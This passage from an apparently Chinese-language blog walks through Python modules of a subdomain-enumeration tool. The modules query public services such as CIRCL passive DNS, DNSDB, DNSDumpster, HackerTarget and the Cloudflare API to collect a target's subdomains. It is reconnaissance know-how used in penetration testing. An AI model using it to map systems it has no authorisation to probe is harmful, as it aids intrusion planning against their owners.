self.collect_subdomains(resp)<br></code></pre></div></td></tr></table></figure><h2 id="3-3-cebaidu"><a href="#3-3-cebaidu" class="headerlink" title="3.3 cebaidu"></a>3.3 cebaidu</h2><p>携带对应的请求参数访问对应的网址，并将返回的内容进行正则匹配子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CeBaidu</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Dataset&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;CeBaiduQuery&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://ce.baidu.com/index/getRelatedSites&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        params = &#123;<span class="hljs-string">&#x27;site_address&#x27;</span>: self.domain&#125;<br>        resp = self.get(self.addr, params)<br>        self.subdomains = self.collect_subdomains(resp)<br></code></pre></div></td></tr></table></figure><h2 id="3-4-chinaz"><a href="#3-4-chinaz" class="headerlink" title="3.4 chinaz"></a>3.4 chinaz</h2><p>携带对应的请求参数访问对应的网址，并将返回的内容进行正则匹配子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Chinaz</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Dataset&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;ChinazQuery&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://alexa.chinaz.com/&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        self.addr = self.addr + self.domain<br>        resp = self.get(self.addr)<br>        self.subdomains = self.collect_subdomains(resp)<br></code></pre></div></td></tr></table></figure><h2 id="3-5-chinaz-api"><a href="#3-5-chinaz-api" class="headerlink" title="3.5 chinaz_api"></a>3.5 chinaz_api</h2><p>携带对应的请求参数访问对应的网址，并将返回的内容进行正则匹配子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ChinazAPI</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Dataset&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;ChinazAPIQuery&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://apidata.chinaz.com/CallAPI/Alexa&#x27;</span><br>        self.api = settings.chinaz_api<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        params = &#123;<span class="hljs-string">&#x27;key&#x27;</span>: self.api, <span class="hljs-string">&#x27;domainName&#x27;</span>: self.domain&#125;<br>        resp = self.get(self.addr, params)<br>        self.subdomains = self.collect_subdomains(resp)<br></code></pre></div></td></tr></table></figure><h2 id="3-6-circl-api"><a href="#3-6-circl-api" class="headerlink" title="3.6 circl_api"></a>3.6 circl_api</h2><p>携带对应的请求参数访问对应的网址，并将返回的内容进行正则匹配子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CirclAPI</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Dataset&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;CirclAPIQuery&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://www.circl.lu/pdns/query/&#x27;</span><br>        self.user = settings.circl_api_username<br>        self.pwd = settings.circl_api_password<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        resp = self.get(self.addr + self.domain, auth=(self.user, self.pwd))<br>        self.subdomains = self.collect_subdomains(resp)<br></code></pre></div></td></tr></table></figure><h2 id="3-7-cloudflare-api"><a href="#3-7-cloudflare-api" class="headerlink" title="3.7 cloudflare_api"></a>3.7 cloudflare_api</h2><p>等之后有了api再分析暂时放下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CloudFlareAPI</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-comment"># 初始化内容</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Dataset&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;CloudFlareAPIQuery&#x27;</span><br>        self.token = settings.cloudflare_api_token<br>        self.addr = <span class="hljs-string">&#x27;https://api.cloudflare.com/client/v4/&#x27;</span><br>        self.header = self.get_header()<br>        self.header.update(&#123;<span class="hljs-string">&#x27;Authorization&#x27;</span>: <span class="hljs-string">&#x27;Bearer &#x27;</span> + self.token&#125;)<br>        self.header.update(&#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>&#125;)<br>        self.proxy = self.get_proxy(self.source)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        query from source</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 访问后按照状态码查看是否返回null</span><br>        account_id_resp = self.get(self.addr + <span class="hljs-string">&#x27;accounts&#x27;</span>)<br>        <span class="hljs-keyword">if</span> account_id_resp:<br>            <span class="hljs-keyword">if</span> account_id_resp.status_code != <span class="hljs-number">200</span>:<br>                <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-comment"># 转为json类型</span><br>        result = account_id_resp.json()[<span class="hljs-string">&#x27;result&#x27;</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result:<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-comment"># 进一步构建请求</span><br>        account_id = result[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;id&#x27;</span>]<br>        <span class="hljs-comment"># query domain zone, if it not exist, create</span><br>        zones_resp = self.get(self.addr + <span class="hljs-string">&#x27;zones&#x27;</span>,<br>                              params=&#123;<span class="hljs-string">&#x27;name&#x27;</span>: self.domain&#125;, check=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">if</span> zones_resp:<br>            <span class="hljs-keyword">if</span> zones_resp.status_code == <span class="hljs-number">200</span>:<br>                <span class="hljs-keyword">if</span> zones_resp.json()[<span class="hljs-string">&#x27;success&#x27;</span>] <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> zones_resp.json()[<span class="hljs-string">&#x27;result&#x27;</span>]:<br>                    zone_id = self.create_zone(account_id)<br>                    <span class="hljs-keyword">if</span> zone_id:<br>                        self.list_dns(zone_id)<br>                        <span class="hljs-keyword">return</span><br>                    <span class="hljs-keyword">return</span><br>                <span class="hljs-keyword">elif</span> zones_resp.json()[<span class="hljs-string">&#x27;success&#x27;</span>]:<br>                    zone_id = self.create_zone(account_id)<br>                    <span class="hljs-keyword">if</span> zone_id:<br>                        self.list_dns(zone_id)<br>                    <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">elif</span> zones_resp.status_code == <span class="hljs-number">403</span>:<br>                logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>,<br>                           <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.domain&#125;</span> is banned or not a registered domain, &#x27;</span><br>                           <span class="hljs-string">f&#x27;so cannot be added to Cloudflare.&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">else</span>:<br>                logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>,<br>                           <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;zones_resp.status_code&#125;</span> <span class="hljs-subst">&#123;zones_resp.text&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_zone</span>(<span class="hljs-params">self, account_id</span>):</span><br>        data = &#123;<span class="hljs-string">&quot;name&quot;</span>: self.domain, <span class="hljs-string">&quot;account&quot;</span>: &#123;<span class="hljs-string">&quot;id&quot;</span>: account_id&#125;,<br>                <span class="hljs-string">&quot;jump_start&quot;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;full&quot;</span>&#125;<br>        create_zone_resp = self.post(self.addr + <span class="hljs-string">&#x27;zones&#x27;</span>, json=data, check=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> create_zone_resp:<br>            logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;create_zone_resp.status_code&#125;</span> <span class="hljs-subst">&#123;create_zone_resp.text&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">if</span> create_zone_resp.json()[<span class="hljs-string">&#x27;success&#x27;</span>]:<br>            <span class="hljs-keyword">return</span> create_zone_resp.json()[<span class="hljs-string">&#x27;result&#x27;</span>][<span class="hljs-string">&#x27;id&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.domain&#125;</span> is temporarily banned &#x27;</span><br>                                <span class="hljs-string">f&#x27;and cannot be added to Cloudflare&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">list_dns</span>(<span class="hljs-params">self, zone_id</span>):</span><br>        page = <span class="hljs-number">1</span><br>        list_dns_resp = self.get(self.addr + <span class="hljs-string">f&#x27;zones/<span class="hljs-subst">&#123;zone_id&#125;</span>/dns_records&#x27;</span>,<br>                                 params=&#123;<span class="hljs-string">&#x27;page&#x27;</span>: page, <span class="hljs-string">&#x27;per_page&#x27;</span>: <span class="hljs-number">10</span>&#125;)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> list_dns_resp:<br>            logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>,<br>                       <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;list_dns_resp.status_code&#125;</span> <span class="hljs-subst">&#123;list_dns_resp.text&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br>        subdomains = self.match_subdomains(list_dns_resp.text)<br>        self.subdomains.update(subdomains)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.subdomains:<br>            <span class="hljs-comment"># waiting for cloudflare enumerate subdomains</span><br>            sleep(<span class="hljs-number">5</span>)<br>            self.list_dns(zone_id)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                list_dns_resp = self.get(self.addr + <span class="hljs-string">f&#x27;zones/<span class="hljs-subst">&#123;zone_id&#125;</span>/dns_records&#x27;</span>,<br>                                         params=&#123;<span class="hljs-string">&#x27;page&#x27;</span>: page, <span class="hljs-string">&#x27;per_page&#x27;</span>: <span class="hljs-number">10</span>&#125;)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> list_dns_resp:<br>                    logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>,<br>                               <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;list_dns_resp.status_code&#125;</span> <span class="hljs-subst">&#123;list_dns_resp.text&#125;</span>&#x27;</span>)<br>                    <span class="hljs-keyword">return</span><br>                total_pages = list_dns_resp.json()[<span class="hljs-string">&#x27;result_info&#x27;</span>][<span class="hljs-string">&#x27;total_pages&#x27;</span>]<br>                subdomains = (self.match_subdomains(list_dns_resp.text))<br>                self.subdomains.update(subdomains)<br>                page += <span class="hljs-number">1</span><br>                <span class="hljs-keyword">if</span> page &gt; total_pages:<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">return</span><br></code></pre></div></td></tr></table></figure><h2 id="3-8-dnsdb-api"><a href="#3-8-dnsdb-api" class="headerlink" title="3.8 dnsdb_api"></a>3.8 dnsdb_api</h2><p>携带对应的请求参数访问对应的网址，并将返回的内容进行正则匹配子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DNSdbAPI</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Dataset&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;DNSdbAPIQuery&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://api.dnsdb.info/lookup/rrset/name/&#x27;</span><br>        self.api = settings.dnsdb_api_key<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.header.update(&#123;<span class="hljs-string">&#x27;X-API-Key&#x27;</span>: self.api&#125;)<br>        self.proxy = self.get_proxy(self.source)<br>        url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.addr&#125;</span>*.<span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span><br>        resp = self.get(url)<br>        self.subdomains = self.collect_subdomains(resp)<br></code></pre></div></td></tr></table></figure><h2 id="3-9-dnsdumpster"><a href="#3-9-dnsdumpster" class="headerlink" title="3.9 dnsdumpster"></a>3.9 dnsdumpster</h2><p>携带对应的请求参数访问对应的网址，并将返回的内容进行正则匹配子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DNSDumpster</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Dataset&#x27;</span><br>        self.source = <span class="hljs-string">&quot;DNSDumpsterQuery&quot;</span><br>        self.addr = <span class="hljs-string">&#x27;https://dnsdumpster.com/&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.header.update(&#123;<span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;https://dnsdumpster.com&#x27;</span>&#125;)<br>        self.proxy = self.get_proxy(self.source)<br>        resp = self.get(self.addr)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>            <span class="hljs-keyword">return</span><br>        self.cookie = resp.cookies<br>        data = &#123;<span class="hljs-string">&#x27;csrfmiddlewaretoken&#x27;</span>: self.cookie.get(<span class="hljs-string">&#x27;csrftoken&#x27;</span>),<br>                <span class="hljs-string">&#x27;targetip&#x27;</span>: self.domain&#125;<br>        resp = self.post(self.addr, data)<br>        self.subdomains = self.collect_subdomains(resp)<br></code></pre></div></td></tr></table></figure><h2 id="3-10-hackertarget"><a href="#3-10-hackertarget" class="headerlink" title="3.10 hackertarget"></a>3.10 hackertarget</h2><p>携带对应的请求参数访问对应的网址，并将返回的内容进行正则匹配子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HackerTarget</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Dataset&#x27;</span><br>        self.source = <span class="hljs-string">&quot;HackerTargetQuery&quot;</span><br>        self.addr = <span class="hljs-string">&#x27;https://api.hackertarget.com/hostsearch/&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        params = &#123;<span class="hljs-string">&#x27;q&#x27;</span>: self.domain&#125;<br>        resp = self.get(self.addr, params)<br>        self.subdomains = self.collect_subdomains(resp)<br></code></pre></div></td></tr></table></figure><h2 id="3-11-ip138"><a href="#3-11-ip138" class="headerlink" title="3.11 ip138"></a>3.11 ip138</h2><p>携带对应的请求参数访问对应的网址，并将返回的内容进行正则匹配子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IP138</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Dataset&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;IP138Query&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://site.ip138.com/&#123;domain&#125;/domain.htm&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        self.addr = self.addr.<span class="hljs-built_in">format</span>(domain=self.domain)<br>        resp = self.get(self.addr)<br>        self.subdomains = self.collect_subdomains(resp)<br></code></pre></div></td></tr></table></figure><h2 id="3-12-ipv4info-api"><a href="#3-12-ipv4info-api" class="headerlink" title="3.12 ipv4info_api"></a>3.12 ipv4info_api</h2><p>携带对应的请求参数访问对应的网址，并将返回的内容进行正则匹配子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IPv4InfoAPI</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Dataset&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;IPv4InfoAPIQuery&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27; http://ipv4info.com/api_v1/&#x27;</span><br>        self.api = settings.ipv4info_api_key<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        page = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            self.header = self.get_header()<br>            self.proxy = self.get_proxy(self.source)<br>            params = &#123;<span class="hljs-string">&#x27;type&#x27;</span>: <span class="hljs-string">&#x27;SUBDOMAINS&#x27;</span>, <span class="hljs-string">&#x27;key&#x27;</span>: self.api,<br>                      <span class="hljs-string">&#x27;value&#x27;</span>: self.domain, <span class="hljs-string">&#x27;page&#x27;</span>: page&#125;<br>            resp = self.get(self.addr, params)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>                <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">if</span> resp.status_code != <span class="hljs-number">200</span>:<br>                <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 请求不正常通常网络是有问题，不再继续请求下去</span><br>            <span 